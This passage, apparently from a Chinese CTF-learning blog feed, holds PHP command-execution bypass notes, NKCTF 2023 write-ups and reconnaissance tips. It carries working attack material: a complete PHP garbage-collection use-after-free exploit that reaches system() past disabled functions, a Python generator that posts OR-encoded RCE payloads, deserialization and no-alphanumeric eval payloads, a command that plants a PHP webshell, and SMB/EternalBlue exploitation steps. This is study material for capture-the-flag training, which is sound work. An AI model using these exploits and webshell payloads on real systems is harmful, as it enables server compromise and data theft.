????.???【文件上传形式的命令执行】原理是通过POST上传一个文件，文件内容是要执行的命令使用点命令执行该文件时形成条件竞争这个文件默认保存在/tmp/phpxxxx路径下，所以可以通过/???/????????[@-[]来构成这个路径[@-[]为匹配ascii码范围在@-[的字符（A，Z被屏蔽，所以范围大一位）之所以用[@-[]是因为直接用/???/?????????匹配到的其他文件都是小写字母，只有php临时生成的文件才包含大写字母。就算这样，也不一定能够准确地匹配到我们的上传文件，所以可能要多次刷新。POST的参数为?c=.%20/???/????????[@-[]上传下面的内容可以达到命令执行的效果#!  /bin/bashls【数学整数计算】$(())表示运算符计算，且默认相加，~是取反的意思$(())能进行的运算有 + - * / % &amp; | ^ ! AND OR XOR NOT    $(()) = 0    ~$(()) = -0    $((~$(()))) = -1    $((~$(()))) = -1    ~$((~$(()))) = 1    echo $((a+b*c)) = 19    $(($((~ $(()))) $((~ $(()))) $((~ $(()))))) = -3【命令执行后继续对回显操作】（1）使用exit();直接退出。（2）使用POST方法查找目录(post参数可以直接被执行的时候)c=$a=&quot;glob:// /*.txt&quot;;  if ($b = opendir($a)) &#123;    while(($file = readdir($b))) !== false) &#123;      echo&quot;filename:&quot;.$file.&quot;\n&quot;;    &#125;    closedir($b);  &#125;exit(0);（3）在POST传参获取mysql数据c=try &#123;$dbh = new PDO(&#39;mysql:host=localhost;dbname=数据库名&#39;, &#39;账号&#39;,&#39;密码&#39;);foreach($dbh-&gt;query(&#39;select load_file(&quot;文件名&quot;)&#39;) as $row)&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e-&gt;getMessage();exit(0);&#125;exit(0);（4）用POST方法重定向文件内容输出到其他地方c=?&gt;&lt;?php $ffi = FFI::cdef(&quot;int system(const char *command);&quot;);$ffi-&gt;system(&quot;/要读的文件&gt;存到那个文件&quot;);exit();【使用bash内置变量构造RCE】因为一般题目都在/var/www/html下经过多次尝试，最后能构造出nl在加上通配符？匹配文件$&#123;HOME:~0&#125;$&#123;PATH:~0&#125;$&#123;PWD:~A&#125;$&#123;USER:~A&#125;</code></pre><h5 id="上面提到的一些小脚本或快捷命令"><a href="#上面提到的一些小脚本或快捷命令" class="headerlink" title="上面提到的一些小脚本或快捷命令"></a>上面提到的一些小脚本或快捷命令</h5><p>下面是通过或运算构造字符（无字母数字命令执行）<br>通过一些字符互相运算后构造得到我们的payload<br>当异或自增和取反构造字符都无法使用，但是可以用|<br>要求使用POST方式传参，且传入的参数可以直接执行时<br>但是注意尽量使用Python发包，hackbar和BP有时候不是很好用。</p><pre><code>import reimport urllibimport requestsfrom urllib import parse hex_i = &quot;&quot; hex_j = &quot;&quot; pattern=&#39;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#39;# str1=[&quot;system&quot;,&quot;cat flag.php&quot;]# for p in range(2):     t1 = &quot;&quot;     t2 = &quot;&quot;     for k in str1[p]:         for i in range(256):             for j in range(256):                 if re.search(pattern,chr(i)) :                     break                 if re.search(pattern,chr(j)) :                     continue                 if i &lt; 16:                     hex_i = &quot;0&quot; + hex(i)[2:]                 else:                     hex_i=hex(i)[2:]                 if j &lt; 16:                     hex_j=&quot;0&quot;+hex(j)[2:]                 else:                     hex_j=hex(j)[2:]                 hex_i=&#39;%&#39;+hex_i                 hex_j=&#39;%&#39;+hex_j                 c=chr(ord(urllib.parse.unquote(hex_i))|ord(urllib.parse.unquote(hex_j)))                 if(c ==k):                     t1=t1+hex_i                     t2=t2+hex_j                     break             else:                 continue             break     payload = &quot;(\&quot;&quot;+t1+&quot;\&quot;|\&quot;&quot;+t2+&quot;\&quot;)&quot;     print(payload)payload=&#39;(&quot;%13%19%13%14%05%0d&quot;|&quot;%60%60%60%60%60%60&quot;)(&quot;%03%01%14%00%06%0c%01%07%00%10%08%10&quot;|&quot;%60%60%60%20%60%60%60%60%2e%60%60%60&quot;)&#39;print(payload)data=&#123;    &quot;c&quot;:urllib.parse.unquote(payload)&#125;url=&quot;??????&quot;re=requests.post(url,data=data)print(re.text)</code></pre><p>下面是文件上传的页面</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;body&gt;&lt;form action=&quot;http://40ebaa4e-8bb9-4a0d-ba18-623eea11822d.challenge.ctf.show/&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;2333&quot; /&gt;&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;&lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;&lt;?phpsession_start();?&gt;</code></pre><p>利用PHP垃圾回收漏洞显示出文件内容POC，记得编码</p><pre><code>&lt;?phpfunction ctfshow($cmd) &#123;    global $abc, $helper, $backtrace;    class Vuln &#123;        public $a;        public function __destruct() &#123;             global $backtrace;             unset($this-&gt;a);            $backtrace = (new Exception)-&gt;getTrace();            if(!isset($backtrace[1][&#39;args&#39;])) &#123;                $backtrace = debug_backtrace();            &#125;        &#125;    &#125;    class Helper &#123;        public $a, $b, $c, $d;    &#125;    function str2ptr(&amp;$str, $p = 0, $s = 8) &#123;        $address = 0;        for($j = $s-1; $j &gt;= 0; $j--) &#123;            $address &lt;&lt;= 8;            $address |= ord($str[$p+$j]);        &#125;        return $address;    &#125;    function ptr2str($ptr, $m = 8) &#123;        $out = &quot;&quot;;        for ($i=0; $i &lt; $m; $i++) &#123;            $out .= sprintf(&quot;%c&quot;,($ptr &amp; 0xff));            $ptr &gt;&gt;= 8;        &#125;        return $out;    &#125;    function write(&amp;$str, $p, $v, $n = 8) &#123;        $i = 0;        for($i = 0; $i &lt; $n; $i++) &#123;            $str[$p + $i] = sprintf(&quot;%c&quot;,($v &amp; 0xff));            $v &gt;&gt;= 8;        &#125;    &#125;    function leak($addr, $p = 0, $s = 8) &#123;        global $abc, $helper;        write($abc, 0x68, $addr + $p - 0x10);        $leak = strlen($helper-&gt;a);        if($s != 8) &#123; $leak %= 2 &lt;&lt; ($s * 8) - 1; &#125;        return $leak;    &#125;    function parse_elf($base) &#123;        $e_type = leak($base, 0x10, 2);        $e_phoff = leak($base, 0x20);        $e_phentsize = leak($base, 0x36, 2);        $e_phnum = leak($base, 0x38, 2);        for($i = 0; $i &lt; $e_phnum; $i++) &#123;            $header = $base + $e_phoff + $i * $e_phentsize;            $p_type  = leak($header, 0, 4);            $p_flags = leak($header, 4, 4);            $p_vaddr = leak($header, 0x10);            $p_memsz = leak($header, 0x28);            if($p_type == 1 &amp;&amp; $p_flags == 6) &#123;                 $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;                $data_size = $p_memsz;            &#125; else if($p_type == 1 &amp;&amp; $p_flags == 5) &#123;                 $text_size = $p_memsz;            &#125;        &#125;        if(!$data_addr || !$text_size || !$data_size)            return false;        return [$data_addr, $text_size, $data_size];    &#125;    function get_basic_funcs($base, $elf) &#123;        list($data_addr, $text_size, $data_size) = $elf;        for($i = 0; $i &lt; $data_size / 8; $i++) &#123;            $leak = leak($data_addr, $i * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref = leak($leak);                                if($deref != 0x746e6174736e6f63)                    continue;            &#125; else continue;            $leak = leak($data_addr, ($i + 4) * 8);            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;                $deref = leak($leak);                if($deref != 0x786568326e6962)                    continue;            &#125; else continue;            return $data_addr + $i * 8;        &#125;    &#125;    function get_binary_base($binary_leak) &#123;        $base = 0;        $start = $binary_leak &amp; 0xfffffffffffff000;        for($i = 0; $i &lt; 0x1000; $i++) &#123;            $addr = $start - 0x1000 * $i;            $leak = leak($addr, 0, 7);            if($leak == 0x10102464c457f) &#123;                return $addr;            &#125;        &#125;    &#125;    function get_system($basic_funcs) &#123;        $addr = $basic_funcs;        do &#123;            $f_entry = leak($addr);            $f_name = leak($f_entry, 0, 6);            if($f_name == 0x6d6574737973) &#123;                return leak($addr + 8);            &#125;            $addr += 0x20;        &#125; while($f_entry != 0);        return false;    &#125;    function trigger_uaf($arg) &#123;        $arg = str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);        $vuln = new Vuln();        $vuln-&gt;a = $arg;    &#125;    if(stristr(PHP_OS, &#39;WIN&#39;)) &#123;        die(&#39;This PoC is for *nix systems only.&#39;);    &#125;    $n_alloc = 10;     $contiguous = [];    for($i = 0; $i &lt; $n_alloc; $i++)        $contiguous[] = str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);    trigger_uaf(&#39;x&#39;);    $abc = $backtrace[1][&#39;args&#39;][0];    $helper = new Helper;    $helper-&gt;b = function ($x) &#123; &#125;;    if(strlen($abc) == 79 || strlen($abc) == 0) &#123;        die(&quot;UAF failed&quot;);    &#125;    $closure_handlers = str2ptr($abc, 0);    $php_heap = str2ptr($abc, 0x58);    $abc_addr = $php_heap - 0xc8;    write($abc, 0x60, 2);    write($abc, 0x70, 6);    write($abc, 0x10, $abc_addr + 0x60);    write($abc, 0x18, 0xa);    $closure_obj = str2ptr($abc, 0x20);    $binary_leak = leak($closure_handlers, 8);    if(!($base = get_binary_base($binary_leak))) &#123;        die(&quot;Couldn&#39;t determine binary base address&quot;);    &#125;    if(!($elf = parse_elf($base))) &#123;        die(&quot;Couldn&#39;t parse ELF header&quot;);    &#125;    if(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;        die(&quot;Couldn&#39;t get basic_functions address&quot;);    &#125;    if(!($zif_system = get_system($basic_funcs))) &#123;        die(&quot;Couldn&#39;t get zif_system address&quot;);    &#125;    $fake_obj_offset = 0xd0;    for($i = 0; $i &lt; 0x110; $i += 8) &#123;        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));    &#125;    write($abc, 0x20, $abc_addr + $fake_obj_offset);    write($abc, 0xd0 + 0x38, 1, 4);     write($abc, 0xd0 + 0x68, $zif_system);     ($helper-&gt;b)($cmd);    exit();&#125;ctfshow(&quot;指令填写在这里！！！&quot;);ob_end_flush();?&gt;</code></pre><p>读取文件函数一览表</p><pre><code>highlight_file($filename);show_source($filename);print_r(php_strip_whitespace($filename));print_r(file_get_contents($filename));readfile($filename);print_r(file($filename)); // var_dumpfread(fopen($filename,&quot;r&quot;), $size);include($filename); // 非php代码include_once($filename); // 非php代码require($filename); // 非php代码require_once($filename); // 非php代码print_r(fread(popen(&quot;cat flag&quot;, &quot;r&quot;), $size));print_r(fgets(fopen($filename, &quot;r&quot;))); // 读取一行fpassthru(fopen($filename, &quot;r&quot;)); // 从当前位置一直读取到 EOFprint_r(fgetcsv(fopen($filename,&quot;r&quot;), $size));print_r(fgetss(fopen($filename, &quot;r&quot;))); // 从文件指针中读取一行并过滤掉 HTML 标记print_r(fscanf(fopen(&quot;flag&quot;, &quot;r&quot;),&quot;%s&quot;));print_r(parse_ini_file($filename)); // 失败时返回 false , 成功返回配置数组</code></pre><p>读取目录一览表</p><pre><code>print_r(glob(&quot;*&quot;)); // 列当前目录print_r(glob(&quot;/*&quot;)); // 列根目录print_r(scandir(&quot;.&quot;));print_r(scandir(&quot;/&quot;));$d=opendir(&quot;.&quot;);while(false!==($f=readdir($d)))&#123;echo&quot;$f\n&quot;;&#125;$d=dir(&quot;.&quot;);while(false!==($f=$d-&gt;read()))&#123;echo$f.&quot;\n&quot;;&#125;$a=glob(&quot;/*&quot;);foreach($a as $value)&#123;echo $value.&quot;   &quot;;&#125;$a=new DirectoryIterator(&#39;glob:///*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow刷题记录</title>
      <link href="/2023/04/07/CTFshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2023/04/07/CTFshow%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h4 id="本文会一直更新，不会分开多个文章记载刷题记录"><a href="#本文会一直更新，不会分开多个文章记载刷题记录" class="headerlink" title="本文会一直更新，不会分开多个文章记载刷题记录"></a>本文会一直更新，不会分开多个文章记载刷题记录</h4><h5 id="文章只记载最简单的最重要的思路"><a href="#文章只记载最简单的最重要的思路" class="headerlink" title="文章只记载最简单的最重要的思路"></a>文章只记载最简单的最重要的思路</h5><h5 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h5><p>既然是信息泄露，自然不会很难，基本上都是工具一把嗦。</p><pre><code>F12robots.txtjsindex.php~抓包index.phpswww.zip.git.svn.index.php.swp.index.php.bak.index.php.swo.index.php.swn.DS_Store.hg邮箱，电话号码泄露技术文档editor编辑器探针backup.sql/db/db.mdb抓包返回状态</code></pre><h5 id="爆破-BP"><a href="#爆破-BP" class="headerlink" title="爆破(BP)"></a>爆破(BP)</h5><p>爆破简单的用BP完全足够了，难一点的写个Python脚本。</p><pre><code>Payload set         ----&gt;  custom iterator(自定义迭代器)需要进行base64编码  ----&gt;  payload processing 进行编码设置取消Palyload Encoding编码,因为在进行base64加密的时候在最后可能存在 == 会影响base64加密的结果有多重目录的url可以用number爆破出动态地址，同时记得改一下页面index.php</code></pre><h5 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h5><p>请查看下一篇文章。</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NKCTF2023WP</title>
      <link href="/2023/03/27/NKCTF2023WP/"/>
      <url>/2023/03/27/NKCTF2023WP/</url>
      
        <content type="html"><![CDATA[<h5 id="前话"><a href="#前话" class="headerlink" title="前话"></a>前话</h5><p>这次CTF比赛对我来说难度感觉适中偏难吧，很多题都是可以写的<br>只是因为比赛是团队合作，所以就把难题留给大哥们了。<br>当然，这不是重点，重点是从中学到了啥。</p><h4 id="WriteUp"><a href="#WriteUp" class="headerlink" title="WriteUp"></a>WriteUp</h4><h5 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h5><p><strong>BabyPHP</strong></p><pre><code>&lt;?php    error_reporting(0);    class Welcome&#123;        public $name;        public $arg = &#39;oww!man!!&#39;;        public function __construct()&#123;            $this-&gt;name = &#39;ItS SO CREAZY&#39;;        &#125;        public function __destruct()&#123;            if($this-&gt;name == &#39;welcome_to_NKCTF&#39;)&#123;                echo $this-&gt;arg;            &#125;        &#125;    &#125;    function waf($string)&#123;        if(preg_match(&#39;/f|l|a|g|\*|\?/i&#39;, $string))&#123;            die(&quot;you are bad&quot;);        &#125;    &#125;    class Happy&#123;        public $shell;        public $cmd;        public function __invoke()&#123;            $shell = $this-&gt;shell;            $cmd = $this-&gt;cmd;            waf($cmd);            eval($shell($cmd));        &#125;    &#125;    class Hell0&#123;        public $func;        public function __toString()&#123;            $function = $this-&gt;func;            $function();        &#125;    &#125;    if(isset($_GET[&#39;p&#39;]))&#123;        unserialize($_GET[&#39;p&#39;]);    &#125;else&#123;        highlight_file(__FILE__);    &#125;?&gt;进行反序列化&lt;?phperror_reporting(0);class Welcome&#123;    public $name;    public $arg;    public function __construct()    &#123;        $this-&gt;name = new Hell0();    &#125;&#125;function waf($string)&#123;    if (preg_match(&#39;/f|l|a|g|\*|\?/i&#39;, $string)) &#123;        die(&quot;you are bad&quot;);    &#125;&#125;class Happy&#123;    public $shell;    public $cmd;    public function __construct()    &#123;        $this-&gt;shell = &#39;system&#39;;        // flag*?        $this-&gt;cmd = &#39;cd /;more `php -r &quot;echo chr(102).chr(49).chr(97).chr(103);&quot;`&#39;;    &#125;    public function __invoke()    &#123;        $shell = $this-&gt;shell;        $cmd = $this-&gt;cmd;        waf($cmd);        eval($shell($cmd));    &#125;&#125;class Hell0&#123;    public $func;    public function __construct()    &#123;        $this-&gt;func = new Happy();    &#125;&#125;$a = new Welcome();echo urlencode(serialize($a));</code></pre><p><strong>EazyPHP</strong></p><pre><code>&lt;?php     highlight_file(__FILE__);    error_reporting(0);    if($_GET[&#39;a&#39;] != $_GET[&#39;b&#39;] &amp;&amp; md5($_GET[&#39;a&#39;]) == md5($_GET[&#39;b&#39;]))&#123;        if((string)$_POST[&#39;c&#39;] != (string)$_POST[&#39;d&#39;] &amp;&amp; sha1($_POST[&#39;c&#39;]) === sha1($_POST[&#39;d&#39;]))&#123;            if($_GET[&#39;e&#39;] != 114514 &amp;&amp; intval($_GET[&#39;e&#39;]) == 114514)&#123;                if(isset($_GET[&#39;NS_CTF.go&#39;]))&#123;                    if(isset($_POST[&#39;cmd&#39;]))&#123;                        if(!preg_match(&#39;/[0-9a-zA-Z]/i&#39;, $_POST[&#39;cmd&#39;]))&#123;                            eval($_POST[&#39;cmd&#39;]);                        &#125;else&#123;                            die(&#39;error!!!!!!&#39;);                        &#125;                    &#125;else&#123;                        die(&#39;error!!!!!&#39;);                    &#125;                &#125;else&#123;                    die(&#39;error!!!!&#39;);                &#125;            &#125;else&#123;                die(&#39;error!!!&#39;);            &#125;        &#125;else&#123;            die(&#39;error!!&#39;);        &#125;    &#125;else&#123;        die(&#39;error!&#39;);    &#125;?&gt; error!其中使用[]通配符绕过c=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01%7FF%DC%93%A6%B6%7E%01%3B%02%9A%AA%1D%B2V%0BE%CAg%D6%88%C7%F8K%8CLy%1F%E0%2B%3D%F6%14%F8m%B1i%09%01%C5kE%C1S%0A%FE%DF%B7%608%E9rr/%E7%ADr%8F%0EI%04%E0F%C20W%0F%E9%D4%13%98%AB%E1.%F5%BC%94%2B%E35B%A4%80-%98%B5%D7%0F%2A3.%C3%7F%AC5%14%E7M%DC%0F%2C%C1%A8t%CD%0Cx0Z%21Vda0%97%89%60k%D0%BF%3F%98%CD%A8%04F%29%A1&amp;d=%25PDF-1.3%0A%25%E2%E3%CF%D3%0A%0A%0A1%200%20obj%0A%3C%3C/Width%202%200%20R/Height%203%200%20R/Type%204%200%20R/Subtype%205%200%20R/Filter%206%200%20R/ColorSpace%207%200%20R/Length%208%200%20R/BitsPerComponent%208%3E%3E%0Astream%0A%FF%D8%FF%FE%00%24SHA-1%20is%20dead%21%21%21%21%21%85/%EC%09%239u%9C9%B1%A1%C6%3CL%97%E1%FF%FE%01sF%DC%91f%B6%7E%11%8F%02%9A%B6%21%B2V%0F%F9%CAg%CC%A8%C7%F8%5B%A8Ly%03%0C%2B%3D%E2%18%F8m%B3%A9%09%01%D5%DFE%C1O%26%FE%DF%B3%DC8%E9j%C2/%E7%BDr%8F%0EE%BC%E0F%D2%3CW%0F%EB%14%13%98%BBU.%F5%A0%A8%2B%E31%FE%A4%807%B8%B5%D7%1F%0E3.%DF%93%AC5%00%EBM%DC%0D%EC%C1%A8dy%0Cx%2Cv%21V%60%DD0%97%91%D0k%D0%AF%3F%98%CD%A4%BCF%29%B1&amp;cmd=(&quot;%13%19%13%14%05%0d&quot;^&quot;%60%60%60%60%60%60&quot;)(&quot;%03%01%14%00%00%06%00&quot;^&quot;%60%60%60%20%2f%60%2a&quot;);</code></pre><p><strong>HardPHP</strong></p><pre><code>&lt;?php// not only ++error_reporting(0);highlight_file(__FILE__);if (isset($_POST[&#39;NKCTF&#39;])) &#123;    $NK = $_POST[&#39;NKCTF&#39;];    if (is_string($NK)) &#123;        if (!preg_match(&quot;/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;,$NK) &amp;&amp; strlen($NK) &lt; 105)&#123;            eval($NK);        &#125;else&#123;            echo(&quot;hacker!!!&quot;);        &#125;    &#125;else&#123;        phpinfo();    &#125;&#125;?&gt;【1】利用自增方法NKCTF=$_=(_/_._)[&#39;$&#39;==&#39;_&#39;];$_++;$__=$_.$_++;$_++;$_++;$_++;$__.=$_;$_++;$_=_.$__.$_;$$_[_]($$_[__]);&amp;_=readfile&amp;__=/flag【2】先传ShellNKCTF=%24_%3D(_%2F_._)%5B___%5D%3B%24__%3D%2B%2B%24_%3B%24_____%3D%2B%2B%24_.%24__%3B%2B%2B%24_%2F%2B%2B%24_%3B%24_%3D_.%24_____.%3D%2B%2B%24_.%2B%2B%24_%3B%24%24_%5B___%5D(%24%24_%5B_%5D)%3B&amp;___=shell_exec&amp;_=echo &#39;&lt;?php eval($_POST[1])?&gt;&#39; &gt;1.php     再输出FLAG1=echo file_get_contents(&#39;/flag&#39;);</code></pre><p><strong>EasyPMS</strong></p><pre><code>禅道系统存在命令执行和权限绕过漏洞，根据0Day漏洞的POC执行就行了</code></pre><h5 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h5><p><strong>Blue取证磁盘</strong></p><pre><code>【预期解】使用永恒之蓝攻击【非预期解】虚拟机直接导入先扫出IP地址使用nmap尝试扫描其他smb漏洞      nmap -P --script=smb-vuln*  IP利用ms09的CVE获取Shell然后打开【严重非预期解】WinHex一把嗦</code></pre><p><strong>三体</strong><br><a href="https://www.bilibili.com/video/BV1Ai4y1V7rg/">老题目了</a></p><pre><code>from PIL import Imagedef decode(im):    width, height = im.size    lst = [ ]    for y in range(height):        for x in range(width):            red, green, blue = im.getpixel((x, y))            if (blue | green | red) == 0:                break                        index = (green &lt;&lt; 8) + blue            lst.append( chr(index) )    return &#39;&#39;.join(lst)def main(filename: str):    all_text = decode(Image.open(filename))    with open(&quot;&#123;&#125;_decode.txt&quot;.format(&#39;.&#39;.join(filename.split(&#39;.&#39;)[:-1])), &quot;w&quot;, encoding = &quot;utf-8&quot;) as f:        f.write(all_text)if __name__ == &#39;__main__&#39;:    main(&#39;三体.bmp&#39;)</code></pre><p><strong>THMaster东方星莲船打到10亿分</strong></p><pre><code>【1】简简单单网上找修改器改分数【2】CheatEngine修改游戏数据</code></pre><p><strong>easy_rgb</strong></p><pre><code>用Kali的工具gaps具体指令自己网上找然后发现三个文档r.txt   g.txt   b.txt按照rgb的顺序每次读一位字符得到压缩包字节流r = &quot;5b04000d663f400000006c6e747a434fbc7d0225c4060b2905cf0a280807372873460041100000ba56b200000000000000006c6e7400000110ea63055a596785d14500010000600745213&quot;g = &quot;0040000ba56b2000000066778f4ac280276f9fb28fb3c282b4fdf7d8a0944bc722bd65b0410083a5492004008200000000006677800000008cc73d1c7630a5f595b000001500800015d38&quot;b = &quot;4310083a54920040080061247309bcac200235fff7778acdfc0401090b3a37c1fcf3000204000d663f40000004000020000061247a20000004dd5985a5d14663000600000a0000004332&quot;data = &quot;&quot;for i in range(len(r)):    try:        data += r[i] + g[i] + b[i]    except:        breakdata += r[-1] + g[-1]with open(&#39;flag.zip&#39;, &#39;wb&#39;) as f:    f.write(bytes.fromhex(data))</code></pre><p><strong>easy_word</strong></p><pre><code>提示如下:小明这个笨蛋，给文档设置了一个密码，但是他自己却忘记了密码，他知道以下信息：1.密码是数学和大小写英语的随机生成的2.hash函数：输出大小 256 bits 内部大小 256 区块大小    512 长度大小 64 字符尺寸 323.密码：h??vO??0 (?号部分为小明已经忘记的位置)  哈希：b75d1224 ... (后面不记得了...)写脚本跑一下import hashlibchars = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;for c1 in chars:    for c2 in chars:        for c3 in chars:            for c4 in chars:                password = &quot;h&#123;&#125;&#123;&#125;vO&#123;&#125;&#123;&#125;0&quot;.format(c1, c2, c3, c4)                hashcode = hashlib.sha256(password.encode()).hexdigest()                if hashcode[:8] == &quot;b75d1224&quot;:                    print(&quot;&#123;&#125;   &#123;&#125;&quot;.format(password, hashcode))                    h4evOF90   b75d1224d1321f5acfe0fb499ff02ab0f15d199e227c77c84c1162340bc6c771发现有一个图片猜测是LSB，直接解密</code></pre><p><strong>first_spam_of_rabbit_year</strong></p><pre><code>文档底下的社会主义核心价值观编码解码为：rabbit 又 move再用佛又曰得出的文本有不可显示字符零宽解密   https://offdev.net/demos/zwsp-steg-js将key和密文清除零宽后分别解密得到新密文最后用rabbit解密   https://www.codeeeee.com/encrypt/rabbit.html</code></pre><p><strong>easy_bmp</strong></p><pre><code>修改宽并使用脚本爆破高显示出部分key解压出一个二维码扫得flag</code></pre><p><strong>baby_music</strong></p><pre><code>WinHex打开发现全是1027和1127盲猜是二进制数据，把1027改为0,1127改为1得到一个zip，里面有脚本压缩包的提示为摩斯密码猜测明文攻击 echo -n &quot;89504E470D0A1A0A0000000D49484452&quot; | xxd -r -ps &gt; png_header</code></pre><p><strong>easymusic</strong></p><pre><code>提示OpenPuff，需要三个密码用notepad++打开音频文件发现第一个密码Kali安装Audacity选择spectrogram进行频谱分析得到一个密码选择波形分析，发现对应二进制的01变化，高电平表示1，低电平表示0，二进制数转换成字符串得到第三个密码最后提取出隐藏Flag</code></pre><p><strong>easy_pic</strong></p><pre><code>formast分离出一个图片010编辑器分析出隐藏数据得到一个照片PS更改宽高得到隐藏Flag</code></pre><h5 id="区块链"><a href="#区块链" class="headerlink" title="区块链"></a>区块链</h5><p><strong>Signin</strong><br>不会。</p><h4 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h4><p>反正感觉这次比赛还是有很大作用的，以后继续努力（敷衍中，睡觉了）</p>]]></content>
      
      
      <categories>
          
          <category> 日报 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>说点啥好呢？</title>
      <link href="/2023/03/21/%E8%AF%B4%E7%82%B9%E5%95%A5%E5%A5%BD%E5%91%A2%EF%BC%9F/"/>
      <url>/2023/03/21/%E8%AF%B4%E7%82%B9%E5%95%A5%E5%A5%BD%E5%91%A2%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<p><strong>我现在在写的文章是一个完整的系列，也是我学习的路线。</strong><br><strong>如果你有仔细看就会发现它一开始就不是针CTF竞赛的。</strong><br><strong>所以这个系列（或许可以这么说吧哈哈）很大概率会持续更新下去。</strong><br><strong>对于下个部分的内容，我在考虑</strong><br><strong>是<code>穷举篇</code>还是<code>SQL注入绕过技术篇</code>还是<code>文件上传篇</code>。</strong><br><strong>反正到时候写出来就知道了。</strong><br><strong>还有，我对待这个博客仍然是个人博客的态度</strong><br><strong>不指望也不希望太多人传之类的。</strong></p><h5 id="20230707补档"><a href="#20230707补档" class="headerlink" title="20230707补档"></a>20230707补档</h5><p>补充一下TOP10漏洞：</p><ol><li>SQL注入</li><li>失效的身份认证和会话管理</li><li>跨站脚本攻击XSS</li><li>直接引用不安全的对象</li><li>安全配置错误</li><li>敏感信息泄露</li><li>缺少功能级的访问控制</li><li>跨站请求伪造CSRF</li><li>实验含有已知漏洞的组件</li><li>未验证的重定向和转发</li></ol>]]></content>
      
      
      <categories>
          
          <category> 闲聊 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 闲聊 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>说点啥好呢？</title>
      <link href="/2023/03/21/%E7%8A%B9%E8%B1%AB/"/>
      <url>/2023/03/21/%E7%8A%B9%E8%B1%AB/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>信息收集概述</title>
      <link href="/2023/03/20/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%A6%82%E8%BF%B0/"/>
      <url>/2023/03/20/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%A6%82%E8%BF%B0/</url>
      
        <content type="html"><![CDATA[<h4 id="一些基本概念"><a href="#一些基本概念" class="headerlink" title="一些基本概念"></a>一些基本概念</h4><p>旁站：是和目标网站在同一台服务器上的其它的网站。<br>C段：是和目标服务器ip处在同一个C段的其它服务器。<br>ARL资产侦查灯塔：快速发现并整理企业外网资产并为资产构建基础数据库的工具（想要的自己找）</p><h4 id="收集操作"><a href="#收集操作" class="headerlink" title="收集操作"></a>收集操作</h4><p>Whois操作<br>Kali系统中，Whois己经默认安装，只需输入要查询的域名即可</p><pre><code>whois  +  域名（一般域名不包含主机名，如·baidu.com）</code></pre><p>网站查询及反查<br><a href="https://whois.chinaz.com/">站长之家</a><br><a href="https://site.ip138.com/">IP查询网</a><br><a href="https://whois.aliyun.com/">阿里云查询</a></p><p>备案查询<br><a href="https://www.beianx.cn/">ICP备案查询网</a><br><a href="http://www.tianyancha.como/">天眼查</a></p><p>收集子域名信息<br><a href="https://searchdns.netcraft.com/">网站查询</a><br><a href="https://dnsdumpster.com/">DNSdumpster网站查询</a></p><p>通过查看网站的证书</p><p>利用域传送漏洞</p><pre><code>原理:一台备用服务器使用来自主服务器的数据刷新系的域（zone）数据库     但许多DNS服务器却被错误地配置成只要有client发出请求     就会向对方提供一个zone数据库的详细信息（没有身份认证）利用:（1）Kali的dig工具             dig axfr @DNS服务器 要查询的域名     （2）nslookup工具     